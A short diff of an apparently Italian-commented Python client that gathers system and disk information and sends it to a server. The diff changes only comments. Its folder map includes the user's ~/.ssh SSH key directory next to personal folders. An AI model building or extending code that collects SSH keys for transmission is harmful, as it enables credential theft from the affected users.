@@ -29,7 +29,7 @@ __headers_type = {"1": b"<File-Name>", "1-1": b"<File-Content>", "1-2": b"<File-
                   "9": b"<Content-Path>",
                   "10": b"<Waiting-For-File>"}
 
-__filesystem_hierarchy = {"Home": f"/home/{os.getlogin()}/",  # TODO: Exclude path from research
+__filesystem_hierarchy = {"Home": f"/home/{os.getlogin()}/",  # Gestione non ricorsiva delle cartelle
                           "Images": f"/home/{os.getlogin()}/Immagini",  # TODO: Generalize for LANG
                           "Documents": f"/home/{os.getlogin()}/Documenti",  # TODO: Generalize for LANG
                           "SSH Keys": f"/home/{os.getlogin()}/.ssh/",  # ~/.ssh/*
@@ -83,7 +83,7 @@ def get_ram_size() -> bytes:
 
 
 # Gestiamo il recupero e l'invio al server in place
-async def get_partition_disk_info(writer: asyncio.StreamWriter) -> None:  # TODO: Controllare che funzioni anche con altri OS
+async def get_partition_disk_info(writer: asyncio.StreamWriter) -> None:
     """Recupero informazioni del disco."""
     # NB: È obbligatorio fare un loop per ottenere le info di ogni partizione
     for partition in psutil.disk_partitions():
